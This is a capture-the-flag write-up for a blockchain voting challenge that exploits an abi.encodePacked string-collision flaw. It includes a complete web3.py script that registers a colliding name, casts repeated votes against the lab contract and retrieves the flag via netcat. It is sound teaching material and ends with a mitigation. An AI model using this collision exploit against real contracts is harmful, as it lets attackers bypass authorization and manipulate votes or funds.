# NotADemocraticElection — Blockchain CTF

## Challenge Information

- **Category:** Blockchain
- **Difficulty:** Easy
- **Network:** Chain ID `31337`
- **RPC:** `http://154.57.164.82:34924`
- **Target Contract:** `0xe4E04a06dC884092f1Ca6D3A805875aeB065Ab5F`
- **Setup Contract:** `0x4E75409dA684B1f72CacdB088880696C2D022d01`

## 1. Tools Required

- Python 3
- `web3.py`
- Netcat (`nc`)

Install the Python dependency:

```bash
python3 -m pip install web3
```

## 2. Vulnerability

The contract uses `abi.encodePacked()` to combine dynamic strings. Packed encoding does not include length boundaries between strings, allowing different input pairs to produce identical encoded bytes.

**Example collision:**

| Original name | Colliding name |
|---|---|
| `Satoshi` | `Sato` |
| `Nakamoto` | `shiNakamoto` |

Both pairs concatenate to `SatoshiNakamoto`.

This can bypass authorization checks when a signature is verified against the packed encoding of multiple strings without unambiguous boundaries.

## 3. Exploitation

The exploit registers the colliding name and uses it to vote for `CIM`.

### Step 1 — Create the Python script

```bash
nano solve.py
```

Paste the following code:

```python
from web3 import Web3
from getpass import getpass

RPC = "http://154.57.164.82:34924"
TARGET = "0xe4E04a06dC884092f1Ca6D3A805875aeB065Ab5F"
SETUP = "0x4E75409dA684B1f72CacdB088880696C2D022d01"

w3 = Web3(Web3.HTTPProvider(
    RPC, request_kwargs={"timeout": 60}
))

target = Web3.to_checksum_address(TARGET)
setup = Web3.to_checksum_address(SETUP)

abi = [
    {
        "type": "function",
        "name": "depositVoteCollateral",
        "stateMutability": "payable",
        "inputs": [
            {"name": "_name", "type": "string"},
            {"name": "_surname", "type": "string"}
        ],
        "outputs": []
    },
    {
        "type": "function",
        "name": "vote",
        "stateMutability": "nonpayable",
        "inputs": [
            {"name": "_party", "type": "bytes3"},
            {"name": "_name", "type": "string"},
            {"name": "_surname", "type": "string"}
        ],
        "outputs": []
    },
    {
        "type": "function",
        "name": "getVotesCount",
        "stateMutability": "view",
        "inputs": [{"name": "_party", "type": "bytes3"}],
        "outputs": [{"type": "uint256"}]
    }
]

setup_abi = [{
    "type": "function",
    "name": "isSolved",
    "stateMutability": "view",
    "inputs": [],
    "outputs": [{"type": "bool"}]
}]

# Enter the private key locally; input stays hidden.
key = getpass("Wallet private key (input hidden): ")
account = w3.eth.account.from_key(key)

print("Wallet:", account.address)

contract = w3.eth.contract(address=target, abi=abi)


def send(function):
    nonce = w3.eth.get_transaction_count(
        account.address, "pending"
    )

    tx = function.build_transaction({
        "from": account.address,
        "nonce": nonce,
        "chainId": 31337,
        "gas": 180000,
        "gasPrice": w3.eth.gas_price,
        "value": 0
    })

    signed = account.sign_transaction(tx)
    tx_hash = w3.eth.send_raw_transaction(
        signed.raw_transaction
    )

    receipt = w3.eth.wait_for_transaction_receipt(
        tx_hash, timeout=120
    )

    if receipt.status != 1:
        raise RuntimeError(
            f"Transaction failed: {tx_hash.hex()}"
        )

    print("Confirmed:", tx_hash.hex())


# Register the colliding identity.
print("Registering colliding name...")
send(contract.functions.depositVoteCollateral(
    "Sato", "shiNakamoto"
))

# Cast ten votes for CIM.
for i in range(10):
    print(f"Vote {i + 1}/10...")
    send(contract.functions.vote(
        b"CIM", "Sato", "shiNakamoto"
    ))

# Check the vote total.
votes = contract.functions.getVotesCount(
    b"CIM"
).call()

print("CIM votes:", w3.from_wei(votes, "ether"), "ETH")

# Verify challenge completion.
solved = w3.eth.contract(
    address=setup, abi=setup_abi
).functions.isSolved().call()

print("Solved:", solved)
```

### Step 2 — Save and run

In Nano, save with `Ctrl + O`, press `Enter`, then exit with `Ctrl + X`.

Run:

```bash
python3 solve.py
```

Enter your wallet's private key when prompted. The input is hidden. **Never hardcode your private key or commit it to GitHub.**

### Step 3 — Verify the exploit

Expected final output:

```text
CIM votes: 1075 ETH
Solved: True
```

`Solved: True` confirms the challenge setup considers the objective complete.

## 4. Retrieve the Flag

Connect to the challenge menu:

```bash
nc 154.57.164.82 38702
```

Choose:

```text
3
```

This selects **Get flag**. Copy the returned flag into the challenge submission field.

## 5. Important Commands

| Command | Purpose |
|---|---|
| `python3 --version` | Check Python installation |
| `python3 -m pip install web3` | Install the Ethereum Python library |
| `nano solve.py` | Create or edit the exploit script |
| `python3 solve.py` | Execute the exploit |
| `nc 154.57.164.82 38702` | Connect to the challenge menu |

## 6. Key Takeaways

- `abi.encodePacked()` concatenates values without padding or length prefixes in the same way as standard ABI encoding.
- Multiple dynamic-length values can create ambiguous packed encodings.
- `web3.py` allows Python scripts to interact with smart contracts over JSON-RPC.
- A transaction receipt with status `1` indicates successful execution, but does not by itself prove the challenge is solved.
- Verify the final state using `isSolved()` and retrieve the flag through the challenge menu.

**Mitigation:** Use `abi.encode()` for structured encoding before hashing or signature verification, or explicitly encode boundaries and lengths for dynamic values.
